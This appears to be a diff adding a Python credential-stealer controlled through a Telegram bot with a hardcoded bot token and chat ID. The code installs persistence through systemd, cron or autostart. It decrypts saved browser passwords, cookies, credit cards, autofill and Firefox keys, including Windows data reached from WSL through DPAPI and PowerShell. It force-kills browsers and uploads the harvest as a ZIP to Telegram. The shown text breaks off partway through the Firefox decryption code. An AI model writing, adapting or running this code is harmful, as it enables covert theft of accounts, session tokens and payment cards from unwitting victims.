@@ -1,0 +1,1556 @@
+#!/usr/bin/env python3
+"""
+HackBrowserData Telegram Bot — Linux Edition
+Platform: Linux (Ubuntu, Debian, Fedora, Arch, etc.)
+Browsers: Chrome, Chromium, Firefox, Brave, Edge, Opera, Vivaldi, Yandex + more
+
+SETUP:
+  1. Set BOT_TOKEN and CHAT_ID in the CONFIGURATION section below.
+  2. Run: python3 bot_linux.py
+  3. The bot auto-installs dependencies, reports to Telegram, and optionally
+     installs persistence (systemd / cron / XDG autostart).
+
+COMMANDS:
+  /extract  — Collect all browser data and send as ZIP
+  /info     — System information
+  /browsers — List detected browsers
+  /status   — Bot status
+  /help     — This message
+"""
+
+# ========================= CONFIGURATION =========================
+# ↓↓↓ FILL THESE IN BEFORE DEPLOYING ↓↓↓
+BOT_TOKEN  = "8225258770:AAHj-43qkE5iKXh9sH99G3gHYVkW7F2g3iM"
+CHAT_ID    = "7688146873"
+# -----------------------------------------------------------------
+# Periodic auto-extraction interval in seconds; 0 = disabled
+CHECK_INTERVAL = 0      # e.g. 3600 for hourly
+# Install persistence on first run (systemd > cron > XDG autostart)
+AUTO_PERSIST   = True
+# =================================================================
+
+import os
+import sys
+import json
+import base64
+import shutil
+import sqlite3
+import tempfile
+import zipfile
+import platform
+import subprocess
+import time
+import threading
+import atexit
+from pathlib import Path
+from datetime import datetime
+
+# ── dependency bootstrap (must come before any third-party import) ──
+def _pip(*pkgs):
+    try:
+        subprocess.run(
+            [sys.executable, '-m', 'pip', 'install', '-q', '--user'] + list(pkgs),
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120
+        )
+    except Exception:
+        pass
+
+try:
+    import requests
+except ImportError:
+    _pip('requests')
+    import requests
+
+try:
+    from Crypto.Cipher  import AES, DES3
+    from Crypto.Util.Padding import unpad
+    from Crypto.Protocol.KDF import PBKDF2
+    from Crypto.Hash    import SHA1, SHA256
+except ImportError:
+    _pip('pycryptodome')
+    from Crypto.Cipher  import AES, DES3
+    from Crypto.Util.Padding import unpad
+    from Crypto.Protocol.KDF import PBKDF2
+    from Crypto.Hash    import SHA1, SHA256
+
+# ========================= TELEGRAM API ==========================
+
+_API = f'https://api.telegram.org/bot{BOT_TOKEN}'
+_FILE_LIMIT = 49 * 1024 * 1024     # 49 MB — Telegram bot limit
+
+
+def _tg(method, **kwargs):
+    """POST to Telegram with exponential-backoff retry (up to 5 attempts)."""
+    url = f'{_API}/{method}'
+    for attempt in range(5):
+        try:
+            r = requests.post(url, timeout=60, **kwargs)
+            data = r.json()
+            if not data.get('ok'):
+                code = data.get('error_code', 0)
+                desc = data.get('description', 'unknown error')
+                if code == 429:
+                    retry = data.get('parameters', {}).get('retry_after', 5)
+                    print(f'[TG] Rate limited, sleeping {retry}s')
+                    time.sleep(retry + 1)
+                    continue
+                print(f'[TG] {method} failed ({code}): {desc}')
+            return data
+        except Exception as e:
+            print(f'[TG] {method} attempt {attempt+1} error: {e}')
+            time.sleep(min(2 ** attempt, 30))
+    return None
+
+
+def delete_webhook():
+    """Remove any existing webhook so getUpdates polling works."""
+    result = _tg('deleteWebhook', data={'drop_pending_updates': False})
+    if result and result.get('ok'):
+        print('[TG] Webhook cleared — polling mode active')
+    else:
+        print('[TG] Warning: deleteWebhook call failed')
+
+
+def send_message(text, chat_id=None):
+    """Send HTML text, chunking at 4 096 characters."""
+    cid = chat_id or CHAT_ID
+    for i in range(0, max(1, len(text)), 4096):
+        _tg('sendMessage', data={
+            'chat_id': cid, 'text': text[i:i + 4096], 'parse_mode': 'HTML'
+        })
+
+
+def send_file(path, chat_id=None, caption=None):
+    """Upload a file; split into parts if it exceeds the 49 MB Telegram limit."""
+    cid = chat_id or CHAT_ID
+    try:
+        size = os.path.getsize(path)
+        if size <= _FILE_LIMIT:
+            with open(path, 'rb') as fh:
+                return _tg('sendDocument',
+                           data={'chat_id': cid, 'caption': caption or ''},
+                           files={'document': (os.path.basename(path), fh)})
+        part_size = _FILE_LIMIT
+        part_num = 0
+        with open(path, 'rb') as fh:
+            while True:
+                chunk = fh.read(part_size)
+                if not chunk:
+                    break
+                part_num += 1
+                part_name = f"{os.path.basename(path)}.part{part_num:02d}"
+                part_path = Path(tempfile.gettempdir()) / part_name
+                try:
+                    part_path.write_bytes(chunk)
+                    with open(part_path, 'rb') as pf:
+                        _tg('sendDocument',
+                            data={'chat_id': cid, 'caption': f'{caption or "File"} (part {part_num})'},
+                            files={'document': (part_name, pf)})
+                finally:
+                    try:
+                        part_path.unlink()
+                    except Exception:
+                        pass
+        send_message(f'Split into {part_num} parts. Reassemble with: cat *.part* > file.zip', cid)
+        return None
+    except Exception as e:
+        send_message(f"⚠️ Upload error: {e}", cid)
+        return None
+
+
+def get_updates(offset=None):
+    url = f'{_API}/getUpdates'
+    params = {'timeout': 30}
+    if offset is not None:
+        params['offset'] = offset
+    for attempt in range(3):
+        try:
+            r = requests.get(url, params=params, timeout=35)
+            data = r.json()
+            if not data.get('ok'):
+                desc = data.get('description', 'unknown')
+                print(f'[TG] getUpdates failed: {desc}')
+                return None
+            return data
+        except Exception as e:
+            print(f'[TG] getUpdates attempt {attempt+1} error: {e}')
+            time.sleep(2 ** attempt)
+    return None
+
+
+def _is_authorized(chat_id):
+    return str(chat_id) == str(CHAT_ID)
+
+# ========================= WSL DETECTION ==========================
+
+_WSL = None
+
+def _is_wsl():
+    global _WSL
+    if _WSL is None:
+        try:
+            with open('/proc/version', 'r') as f:
+                _WSL = 'microsoft' in f.read().lower()
+        except Exception:
+            _WSL = False
+    return _WSL
+
+
+def _dpapi_decrypt_wsl(encrypted_bytes):
+    """Decrypt DPAPI-protected bytes from WSL2 using PowerShell."""
+    try:
+        b64_input = base64.b64encode(encrypted_bytes).decode('ascii')
+        ps_script = (
+            'Add-Type -AssemblyName System.Security;'
+            f'$enc=[System.Convert]::FromBase64String("{b64_input}");'
+            '$dec=[System.Security.Cryptography.ProtectedData]'
+            '::Unprotect($enc,$null,"CurrentUser");'
+            '[System.Convert]::ToBase64String($dec)'
+        )
+        result = subprocess.run(
+            ['powershell.exe', '-NoProfile', '-NonInteractive', '-Command', ps_script],
+            capture_output=True, text=True, timeout=30
+        )
+        if result.returncode == 0 and result.stdout.strip():
+            return base64.b64decode(result.stdout.strip())
+    except Exception as e:
+        print(f'[DPAPI-WSL] Error: {e}')
+    return None
+
+# ========================= SYSTEM INFO ==========================
+
+
+def system_info():
+    return {
+        'platform':  platform.system(),
+        'release':   platform.release(),
+        'arch':      platform.machine(),
+        'hostname':  platform.node() or 'unknown',
+        'username':  (os.environ.get('USER') or os.environ.get('LOGNAME')
+                      or os.environ.get('USERNAME') or 'unknown'),
+        'home':      str(Path.home()),
+        'python':    sys.version.split()[0],
+    }
+
+# ========================= BROWSER PATHS ========================
+
+
+def find_browser_paths():
+    """
+    Return {browser_name: [profile_path, ...]} for Chromium-based browsers
+    and {browser_name: base_dir} for Firefox-based browsers.
+    """
+    home = Path.home()
+    cfg  = home / '.config'
+
+    chromium_bases = {
+        'chrome':            cfg  / 'google-chrome',
+        'chrome-beta':       cfg  / 'google-chrome-beta',
+        'chrome-dev':        cfg  / 'google-chrome-unstable',
+        'chromium':          cfg  / 'chromium',
+        'chromium-snap':     home / 'snap/chromium/common/chromium',
+        'edge':              cfg  / 'microsoft-edge',
+        'edge-beta':         cfg  / 'microsoft-edge-beta',
+        'brave':             cfg  / 'BraveSoftware/Brave-Browser',
+        'opera':             cfg  / 'opera',
+        'opera-beta':        cfg  / 'opera-beta',
+        'vivaldi':           cfg  / 'vivaldi',
+        'vivaldi-snapshot':  cfg  / 'vivaldi-snapshot',
+        'yandex':            cfg  / 'yandex-browser',
+    }
+    firefox_bases = {
+        'firefox':           home / '.mozilla/firefox',
+        'firefox-snap':      home / 'snap/firefox/common/.mozilla/firefox',
+        'firefox-flatpak':   home / '.var/app/org.mozilla.firefox/.mozilla/firefox',
+        'librewolf':         home / '.librewolf',
+        'waterfox':          home / '.waterfox',
+    }
+
+    result = {}
+
+    for name, base in chromium_bases.items():
+        if not base.exists():
+            continue
+        profiles = []
+        try:
+            for item in base.iterdir():
+                if item.is_dir() and (
+                    item.name == 'Default' or item.name.startswith('Profile ')
+                ):
+                    profiles.append(item)
+        except PermissionError:
+            continue
+        if profiles:
+            result[name] = profiles
+
+    for name, base in firefox_bases.items():
+        if base.exists():
+            result[name] = base   # Firefox: base dir; profiles found via profiles.ini
+
+    if _is_wsl():
+        try:
+            for user_dir in Path('/mnt/c/Users').iterdir():
+                if user_dir.name in ('Public', 'Default', 'Default User',
+                                     'All Users', 'desktop.ini'):
+                    continue
+                if not user_dir.is_dir():
+                    continue
+                local   = user_dir / 'AppData' / 'Local'
+                roaming = user_dir / 'AppData' / 'Roaming'
+                wsl_chromium = {
+                    'edge-wsl':    local / 'Microsoft/Edge/User Data',
+                    'chrome-wsl':  local / 'Google/Chrome/User Data',
+                    'brave-wsl':   local / 'BraveSoftware/Brave-Browser/User Data',
+                    'opera-wsl':   roaming / 'Opera Software/Opera Stable',
+                    'vivaldi-wsl': local / 'Vivaldi/User Data',
+                    'yandex-wsl':  local / 'Yandex/YandexBrowser/User Data',
+                }
+                wsl_firefox = {
+                    'firefox-wsl': roaming / 'Mozilla/Firefox',
+                }
+                for wname, wbase in wsl_chromium.items():
+                    if not wbase.exists():
+                        continue
+                    profiles = []
+                    try:
+                        for item in wbase.iterdir():
+                            if item.is_dir() and (
+                                item.name == 'Default'
+                                or item.name.startswith('Profile ')
+                            ):
+                                profiles.append(item)
+                    except PermissionError:
+                        continue
+                    if profiles:
+                        result[wname] = profiles
+                for wname, wbase in wsl_firefox.items():
+                    if wbase.exists():
+                        result[wname] = wbase
+        except Exception as e:
+            print(f'[WSL] Error scanning Windows browsers: {e}')
+
+    return result
+
+
+def find_firefox_profiles(base_path):
+    """Parse profiles.ini and return list of existing profile Paths."""
+    ini  = base_path / 'profiles.ini'
+    profiles = []
+    if ini.exists():
+        try:
+            import configparser
+            cfg = configparser.ConfigParser()
+            cfg.read(ini)
+            for section in cfg.sections():
+                if not section.lower().startswith('profile'):
+                    continue
+                path_val = cfg.get(section, 'Path', fallback=None)
+                if path_val is None:
+                    continue
+                is_rel = cfg.getint(section, 'IsRelative', fallback=1)
+                p = (base_path / path_val) if is_rel else Path(path_val)
+                if p.exists():
+                    profiles.append(p)
+        except Exception:
+            pass
+    if not profiles:                              # fallback: scan for *.default* dirs
+        try:
+            for item in base_path.iterdir():
+                if item.is_dir() and '.default' in item.name:
+                    profiles.append(item)
+        except Exception:
+            pass
+    return profiles
+
+# =================== CHROMIUM DECRYPTION (LINUX) =================
+
+
+def chromium_master_key(browser_base=None):
+    """
+    Native Linux: PBKDF2('peanuts', 'saltysalt', 1, 16) -> 16-byte key for AES-128-CBC.
+    WSL + Windows browser: DPAPI-decrypt from Local State -> 32-byte key for AES-256-GCM.
+    """
+    if _is_wsl() and browser_base and str(browser_base).startswith('/mnt/'):
+        local_state = browser_base / 'Local State'
+        if not local_state.exists():
+            return None
+        try:
+            data = json.loads(local_state.read_text(encoding='utf-8'))
+            enc_key_b64 = data['os_crypt']['encrypted_key']
+            enc_key = base64.b64decode(enc_key_b64)
+            if enc_key[:5] == b'DPAPI':
+                enc_key = enc_key[5:]
+            key = _dpapi_decrypt_wsl(enc_key)
+            if key:
+                return key
+            print('[master_key] DPAPI via PowerShell failed')
+        except Exception as e:
+            print(f'[master_key] WSL key extraction error: {e}')
+        return None
+    return PBKDF2(b'peanuts', b'saltysalt', dkLen=16, count=1,
+                  hmac_hash_module=SHA1)
+
+
+_v20_key_cache = {}
+
+def _derive_v20_key_wsl(browser_base):
+    """Extract the v20 app-bound decryption key via PowerShell from WSL."""
+    if not _is_wsl() or not browser_base:
+        return None
+    cache_key = str(browser_base)
+    if cache_key in _v20_key_cache:
+        return _v20_key_cache[cache_key]
+    ls = browser_base / 'Local State'
+    if not ls.exists():
+        return None
+    try:
+        data = json.loads(ls.read_text(encoding='utf-8'))
+        abk_b64 = data.get('os_crypt', {}).get('app_bound_encrypted_key', '')
+        if not abk_b64:
+            return None
+        abk = base64.b64decode(abk_b64)
+        if abk[:4] != b'APPB':
+            return None
+        dpapi_blob = abk[5:]
+
+        dec1 = _dpapi_decrypt_wsl(dpapi_blob)
+        if dec1 and len(dec1) >= 32:
+            key = dec1[-32:]
+            _v20_key_cache[cache_key] = key
+            return key
+
+        if dec1:
+            dec2 = _dpapi_decrypt_wsl(dec1)
+            if dec2 and len(dec2) >= 32:
+                key = dec2[-32:]
+                _v20_key_cache[cache_key] = key
+                return key
+
+        browser_name = browser_base.parts[-2].lower() if len(browser_base.parts) >= 2 else ''
+        clsid = '708860E0-F641-4611-8895-7D867DD3675B'
+        if 'edge' in browser_name or 'msedge' in browser_name:
+            clsid = 'C6E2C5F8-3E5F-4B2C-8D4A-4B6E2C5F83E5'
+        ps = (
+            f'$t=[Type]::GetTypeFromCLSID([guid]"{clsid}");'
+            '$o=[Activator]::CreateInstance($t);'
+            f'$enc="{abk_b64}";'
+            '$dec=$null;$err=0;'
+            '[void]$o.GetType().InvokeMember("DecryptData",'
+            '"InvokeMethod",$null,$o,@($enc,[ref]$dec,[ref]$err));'
+            '[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($dec))'
+        )
+        r = subprocess.run(
+            ['powershell.exe', '-NoProfile', '-Command', ps],
+            capture_output=True, text=True, timeout=15)
+        if r.returncode == 0 and r.stdout.strip():
+            raw = base64.b64decode(r.stdout.strip())
+            if len(raw) >= 32:
+                key = raw[-32:]
+                _v20_key_cache[cache_key] = key
+                return key
+    except Exception:
+        pass
+    return None
+
+
+def chromium_decrypt_v20(blob, browser_base):
+    """Decrypt a v20 App-Bound encrypted value via WSL PowerShell."""
+    key = _derive_v20_key_wsl(browser_base)
+    if key is None:
+        return ''
+    try:
+        nonce      = blob[3:15]
+        ct_and_tag = blob[15:]
+        ciphertext = ct_and_tag[:-16]
+        tag        = ct_and_tag[-16:]
+        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+        try:
+            return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='replace')
+        except ValueError:
+            return cipher.decrypt(ciphertext).decode('utf-8', errors='replace').rstrip('\x00')
+    except Exception:
+        return ''
+
+
+def chromium_decrypt(blob, key, browser_base=None):
+    """
+    Decrypt a Chromium-encrypted field.
+    v20: App-Bound Encryption (Chrome/Edge 127+) — via PowerShell on WSL.
+    32-byte key (Windows/WSL) -> AES-256-GCM.
+    16-byte key (native Linux) -> AES-128-CBC.
+    """
+    try:
+        if not blob or not key:
+            return ''
+        if blob[:3] == b'v20':
+            if browser_base and _is_wsl():
+                result = chromium_decrypt_v20(blob, browser_base)
+                if result:
+                    return result
+            return ''
+        if blob[:3] in (b'v10', b'v11') and len(key) == 32:
+            nonce      = blob[3:15]
+            ct_and_tag = blob[15:]
+            ciphertext = ct_and_tag[:-16]
+            tag        = ct_and_tag[-16:]
+            cipher     = AES.new(key, AES.MODE_GCM, nonce=nonce)
+            try:
+                return cipher.decrypt_and_verify(ciphertext, tag).decode(
+                    'utf-8', errors='replace')
+            except ValueError:
+                return cipher.decrypt(ciphertext).decode(
+                    'utf-8', errors='replace').rstrip('\x00')
+        if blob[:3] in (b'v10', b'v11'):
+            blob = blob[3:]
+        cipher    = AES.new(key, AES.MODE_CBC, b' ' * 16)
+        plaintext = cipher.decrypt(blob)
+        return unpad(plaintext, 16).decode('utf-8', errors='replace')
+    except Exception:
+        return '[decryption failed]'
+
+
+def _chrome_ts(ts):
+    """Convert Chrome microsecond-since-1601 timestamp to datetime or None."""
+    if not ts or ts <= 0:
+        return None
+    try:
+        return datetime.fromtimestamp((ts - 11_644_473_600_000_000) / 1_000_000)
+    except (OSError, ValueError, OverflowError):
+        return None
+
+# ===================== TEMP-DB HELPER ===========================
+
+
+_BROWSER_PROCS_LINUX = [
+    'chrome', 'chromium', 'chromium-browser', 'google-chrome', 'google-chrome-stable',
+    'msedge', 'microsoft-edge', 'brave', 'brave-browser', 'opera', 'vivaldi',
+    'firefox', 'firefox-esr', 'waterfox', 'librewolf', 'thunderbird',
+    'yandex-browser', 'yandex_browser',
+]
+_BROWSER_PROCS_WIN = [
+    'chrome.exe', 'msedge.exe', 'brave.exe', 'opera.exe', 'vivaldi.exe',
+    'firefox.exe', 'waterfox.exe', 'librewolf.exe', 'thunderbird.exe',
+    'yandex.exe', 'browser.exe', 'iridium.exe', 'chromium.exe',
+]
+
+def _kill_browsers():
+    """Force-kill all known browser processes to release file locks and flush WAL."""
+    killed = []
+    if _is_wsl():
+        for proc_name in _BROWSER_PROCS_WIN:
+            try:
+                r = subprocess.run(
+                    ['taskkill.exe', '/F', '/IM', proc_name],
+                    capture_output=True, timeout=10)
+                if r.returncode == 0:
+                    killed.append(proc_name)
+            except Exception:
+                pass
+    for proc_name in _BROWSER_PROCS_LINUX:
+        try:
+            r = subprocess.run(
+                ['pkill', '-9', '-f', proc_name],
+                capture_output=True, timeout=10)
+            if r.returncode == 0:
+                killed.append(proc_name)
+        except Exception:
+            pass
+    if killed:
+        time.sleep(2)
+    return killed
+
+
+def _wsl_copy(src, dst):
+    """Copy a file via PowerShell when WSL can't access it (browser lock)."""
+    try:
+        win_src = subprocess.run(
+            ['wslpath', '-w', str(src)], capture_output=True, text=True, timeout=5
+        ).stdout.strip()
+        win_dst = subprocess.run(
+            ['wslpath', '-w', str(dst)], capture_output=True, text=True, timeout=5
+        ).stdout.strip()
+        if not win_src or not win_dst:
+            return False
+        ps = f'Copy-Item -LiteralPath "{win_src}" -Destination "{win_dst}" -Force'
+        r = subprocess.run(
+            ['powershell.exe', '-NoProfile', '-NonInteractive', '-Command', ps],
+            capture_output=True, text=True, timeout=15
+        )
+        return r.returncode == 0 and dst.exists()
+    except Exception:
+        return False
+
+
+def _with_db(src, callback):
+    """Copy DB to temp (with WSL fallback), WAL checkpoint, run callback."""
+    tmp = Path(tempfile.gettempdir()) / f'hbd_{os.getpid()}_{id(callback)}_{src.name}'
+    try:
+        copied = False
+        try:
+            shutil.copy2(src, tmp)
+            copied = True
+        except (PermissionError, OSError):
+            pass
+        if not copied and _is_wsl():
+            copied = _wsl_copy(src, tmp)
+        if not copied:
+            print(f'[db] All copy methods failed for {src.name}')
+            return []
+        for suffix in ('-wal', '-shm'):
+            sidecar = src.parent / (src.name + suffix)
+            if sidecar.exists():
+                dst_sc = tmp.parent / (tmp.name + suffix)
+                try:
+                    shutil.copy2(sidecar, dst_sc)
+                except (PermissionError, OSError):
+                    if _is_wsl():
+                        _wsl_copy(sidecar, dst_sc)
+        conn = sqlite3.connect(str(tmp))
+        try:
+            conn.execute('PRAGMA wal_checkpoint(TRUNCATE)')
+        except Exception:
+            pass
+        try:
+            return callback(conn.cursor())
+        finally:
+            conn.close()
+    except Exception as e:
+        print(f'[db] Error reading {src.name}: {e}')
+        return []
+    finally:
+        for suffix in ('', '-wal', '-shm'):
+            try:
+                (tmp.parent / (tmp.name + suffix)).unlink(missing_ok=True)
+            except Exception:
+                pass
+
+# =================== CHROMIUM EXTRACTORS ========================
+
+
+def get_chromium_passwords(profile, key, browser_base=None):
+    db = profile / 'Login Data'
+    if not db.exists():
+        return []
+    def _q(cur):
+        rows = []
+        try:
+            cur.execute(
+                'SELECT origin_url,username_value,password_value,'
+                'date_created,date_last_used FROM logins ORDER BY date_last_used DESC'
+            )
+            for url, user, enc, dc, dlu in cur.fetchall():
+                if user and enc:
+                    rows.append({
+                        'url':       url,
+                        'username':  user,
+                        'password':  chromium_decrypt(enc, key, browser_base),
+                        'created':   str(_chrome_ts(dc) or ''),
+                        'last_used': str(_chrome_ts(dlu) or ''),
+                    })
+        except Exception:
+            pass
+        return rows
+    return _with_db(db, _q)
+
+
+def get_chromium_cookies(profile, key, browser_base=None):
+    db = None
+    for p in [profile / 'Network' / 'Cookies', profile / 'Cookies']:
+        if p.exists():
+            db = p
+            break
+    if db is None:
+        return []
+    def _q(cur):
+        rows = []
+        try:
+            cur.execute(
+                'SELECT host_key,name,encrypted_value,path,expires_utc,'
+                'is_secure,is_httponly FROM cookies ORDER BY host_key'
+            )
+            for host, name, enc, path, exp, sec, httpo in cur.fetchall():
+                if enc:
+                    rows.append({
+                        'host':     host,
+                        'name':     name,
+                        'value':    chromium_decrypt(enc, key, browser_base),
+                        'path':     path,
+                        'expires':  str(_chrome_ts(exp) or ''),
+                        'secure':   bool(sec),
+                        'httponly': bool(httpo),
+                    })
+        except Exception:
+            pass
+        return rows
+    return _with_db(db, _q)
+
+
+def get_chromium_history(profile):
+    db = profile / 'History'
+    if not db.exists():
+        return []
+    def _q(cur):
+        rows = []
+        try:
+            cur.execute(
+                'SELECT url,title,visit_count,last_visit_time '
+                'FROM urls ORDER BY last_visit_time DESC LIMIT 1000'
+            )
+            for url, title, vc, lv in cur.fetchall():
+                rows.append({
+                    'url': url, 'title': title or '',
+                    'visits': vc, 'last_visit': str(_chrome_ts(lv) or ''),
+                })
+        except Exception:
+            pass
+        return rows
+    return _with_db(db, _q)
+
+
+def get_chromium_bookmarks(profile):
+    bm = profile / 'Bookmarks'
+    if not bm.exists():
+        return []
+    bookmarks = []
+    def _walk(node, folder=''):
+        if node.get('type') == 'url':
+            bookmarks.append({
+                'name': node.get('name', ''), 'url': node.get('url', ''),
+                'folder': folder,
+            })
+        elif node.get('type') == 'folder':
+            sub = f"{folder}/{node.get('name','')}" if folder else node.get('name', '')
+            for child in node.get('children', []):
+                _walk(child, sub)
+    try:
+        data = json.loads(bm.read_text(encoding='utf-8'))
+        for root in data.get('roots', {}).values():
+            if isinstance(root, dict):
+                for child in root.get('children', []):
+                    _walk(child)
+    except Exception:
+        pass
+    return bookmarks
+
+
+def get_chromium_credit_cards(profile, key, browser_base=None):
+    db = profile / 'Web Data'
+    if not db.exists():
+        return []
+    def _q(cur):
+        rows = []
+        try:
+            cur.execute(
+                'SELECT name_on_card,expiration_month,expiration_year,'
+                'card_number_encrypted FROM credit_cards'
+            )
+            for name, em, ey, enc in cur.fetchall():
+                if enc:
+                    rows.append({
+                        'name':   name,
+                        'number': chromium_decrypt(enc, key, browser_base),
+                        'expiry': f'{em}/{ey}',
+                    })
+        except Exception:
+            pass
+        return rows
+    return _with_db(db, _q)
+
+
+def get_chromium_downloads(profile):
+    db = profile / 'History'
+    if not db.exists():
+        return []
+    def _q(cur):
+        rows = []
+        try:
+            cur.execute(
+                'SELECT target_path,tab_url,total_bytes,start_time '
+                'FROM downloads ORDER BY start_time DESC LIMIT 500'
+            )
+            for target, url, size, st in cur.fetchall():
+                rows.append({
+                    'path': target, 'url': url,
+                    'size': size, 'date': str(_chrome_ts(st) or ''),
+                })
+        except Exception:
+            pass
+        return rows
+    return _with_db(db, _q)
+
+
+def get_chromium_autofill(profile):
+    db = profile / 'Web Data'
+    if not db.exists():
+        return []
+    def _q(cur):
+        rows = []
+        try:
+            cur.execute(
+                'SELECT name,value,count,date_last_used '
+                'FROM autofill ORDER BY count DESC LIMIT 500'
+            )
+            for name, val, cnt, dlu in cur.fetchall():
+                rows.append({
+                    'field': name, 'value': val,
+                    'count': cnt, 'last_used': str(_chrome_ts(dlu) or ''),
+                })
+        except Exception:
+            pass
+        return rows
+    return _with_db(db, _q)
+
+# ====================== FIREFOX DER UTILITIES ====================
+
+
+def _der_next(data, pos):
+    """Read one DER TLV element. Returns (tag, value_bytes, next_pos)."""
+    tag  = data[pos]; pos += 1
+    b    = data[pos]; pos += 1
+    if b < 0x80:
+        length = b
+    else:
+        n      = b & 0x7f
+        length = int.from_bytes(data[pos:pos + n], 'big')
+        pos   += n
+    return tag, data[pos:pos + length], pos + length
+
+
+def _oid_str(raw):
+    """Decode DER OID bytes to dotted string."""
+    parts = [raw[0] // 40, raw[0] % 40]
+    acc   = 0
+    for b in raw[1:]:
+        acc = (acc << 7) | (b & 0x7f)
+        if not (b & 0x80):
+            parts.append(acc)
+            acc = 0
+    return '.'.join(map(str, parts))
+
+
+_OID_3DES       = '1.2.840.113549.3.7'
+_OID_AES256_CBC = '2.16.840.1.101.3.4.1.42'
+_OID_HMAC_SHA1  = '1.2.840.113549.2.7'
+
+
+def _ff_pbes2_decrypt(blob, password=b''):
+    """
+    Decrypt a Firefox PBES2-encoded DER blob (item2 from metadata, or a11 from
+    nssPrivate).  Handles both PBKDF2-SHA1+3DES-CBC and PBKDF2-SHA256+AES-256-CBC.
+    Returns plaintext bytes or None on failure.
+    """
+    try:
+        # Outer SEQUENCE → { AlgorithmIdentifier, OCTET STRING(ct) }
+        _, outer, _    = _der_next(blob, 0)
+        pos = 0
+        _, alg_id, pos = _der_next(outer, pos)   # AlgorithmIdentifier SEQUENCE
+        _, ciphertext, _ = _der_next(outer, pos) # ciphertext OCTET STRING
+
+        # AlgorithmIdentifier → { OID(PBES2), params SEQUENCE }
+        pos = 0
+        _, _oid_raw, pos = _der_next(alg_id, pos)
+        _, params, _     = _der_next(alg_id, pos)
+
+        # params → { keyDerivationFunc SEQUENCE, encryptionScheme SEQUENCE }
+        pos = 0
+        _, kdf_seq, pos = _der_next(params, pos)
+        _, enc_seq, _   = _der_next(params, pos)
+
+        # keyDerivationFunc → { OID(PBKDF2), PBKDF2-params SEQUENCE }
+        pos = 0
+        _, _kdf_oid, pos  = _der_next(kdf_seq, pos)
+        _, kdf_params, _  = _der_next(kdf_seq, pos)
+
+        # PBKDF2-params → salt OCTET STRING, iterations INTEGER,
+        #                  [keyLength INTEGER], [prf SEQUENCE]
+        pos = 0
+        _, salt,     pos = _der_next(kdf_params, pos)
+        _, iter_raw, pos = _der_next(kdf_params, pos)
+        iterations = int.from_bytes(iter_raw, 'big')
+
+        key_len  = 32
+        hmac_mod = SHA256
+        if pos < len(kdf_params):
+            tag2, val2, pos2 = _der_next(kdf_params, pos)
+            if tag2 == 0x02:                                # INTEGER = keyLength
+                key_len = int.from_bytes(val2, 'big')
+                if pos2 < len(kdf_params):
+                    _, prf_seq, _ = _der_next(kdf_params, pos2)
+                    _, prf_oid_r, _ = _der_next(prf_seq, 0)
+                    if _oid_str(prf_oid_r) == _OID_HMAC_SHA1:
+                        hmac_mod = SHA1
+            elif tag2 == 0x30:                              # SEQUENCE = prf (no keyLength)
+                _, prf_oid_r, _ = _der_next(val2, 0)
+                if _oid_str(prf_oid_r) == _OID_HMAC_SHA1:
+                    hmac_mod = SHA1
+                    key_len  = 24
+
+        # encryptionScheme → { OID(cipher), IV OCTET STRING }
+        pos = 0
+        _, enc_oid_r, pos = _der_next(enc_seq, pos)
+        _, iv, _          = _der_next(enc_seq, pos)
+        cipher_oid = _oid_str(enc_oid_r)
+
+        # Derive key
+        key = PBKDF2(password, salt, dkLen=key_len, count=iterations,
+                     hmac_hash_module=hmac_mod)
+
+        # Decrypt
+        if cipher_oid == _OID_3DES:
+            return DES3.new(key[:24], DES3.MODE_CBC, iv[:8]).decrypt(ciphertext)
+        else:                                               # AES-256-CBC (default)
+            return AES.new(key[:key_len], AES.MODE_CBC, iv).decrypt(ciphertext)
+    except Exception:
+        return None
+
+
+def _ff_extract_cka_value(decrypted_a11):
+    """
+    Extract the raw CKA_VALUE (symmetric key) from a decrypted NSS a11 blob.
+    Based on empirical offsets from firepwd.py: key starts at byte 70.
+    """
+    if len(decrypted_a11) >= 102:           # 70 + 32 → AES-256
+        return decrypted_a11[70:102], _OID_AES256_CBC
+    if len(decrypted_a11) >= 94:            # 70 + 24 → 3DES
+        return decrypted_a11[70:94], _OID_3DES
+    if len(decrypted_a11) >= 32:            # fallback: last 32 bytes
+        return decrypted_a11[-32:], _OID_AES256_CBC
+    return None, None
+
+
+def get_firefox_master_key(profile_path):
+    """
+    Extract the Firefox login-decryption key from key4.db (no master password).
+    Returns (key_bytes, cipher_oid) or (None, None).
+    """
+    key4 = profile_path / 'key4.db'
+    if not key4.exists():
+        return None, None
+
+    def _q(cur):
+        try:
+            cur.execute("SELECT item2 FROM metadata WHERE id='password'")
+            row = cur.fetchone()
+            if not row:
+                return None, None
+            check = _ff_pbes2_decrypt(bytes(row[0]))
+            if check is None or b'password-check' not in check[:20]:
+                return None, None
+
+            cur.execute(
+                "SELECT name FROM sqlite_master "
+                "WHERE type='table' AND name='nssPrivate'"
+            )
+            if not cur.fetchone():
+                return None, None
+
+            cur.execute('SELECT a11 FROM nssPrivate')
+            for (a11_blob,) in cur.fetchall():
+                if not a11_blob:
+                    continue
+                dec = _ff_pbes2_decrypt(bytes(a11_blob))
+                if dec is None:
+                    continue
+                key, oid = _ff_extract_cka_value(dec)
+                if key:
+                    return key, oid
+        except Exception:
+            pass
+        return None, None
+
+    tmp = Path(tempfile.gettempdir()) / f'key4_{os.getpid()}.db'
+    try:
+        copied = False
+        try:
+            shutil.copy2(key4, tmp)
+            copied = True
+        except (PermissionError, OSError):
+            pass
+        if not copied and _is_wsl():
+            copied = _wsl_copy(key4, tmp)
+        if not copied:
+            return None, None
+        for suffix in ('-wal', '-shm'):
+            sc = key4.parent / (key4.name + suffix)
+            if sc.exists():
+                dst_sc = tmp.parent / (tmp.name + suffix)
+                try:
+                    shutil.copy2(sc, dst_sc)
+                except (PermissionError, OSError):
+                    if _is_wsl():
+                        _wsl_copy(sc, dst_sc)
+        conn = sqlite3.connect(str(tmp))
+        try:
+            conn.execute('PRAGMA wal_checkpoint(TRUNCATE)')
+        except Exception:
+            pass
+        try:
+            result = _q(conn.cursor())
+        finally:
+            conn.close()
+        return result if result else (None, None)
+    except Exception:
+        return None, None
+    finally:
+        for suffix in ('', '-wal', '-shm'):
+            try:
+                (tmp.parent / (tmp.name + suffix)).unlink(missing_ok=True)
+            except Exception:
+                pass
+
+
+def _ff_decrypt_field(b64_val, key, cipher_oid):
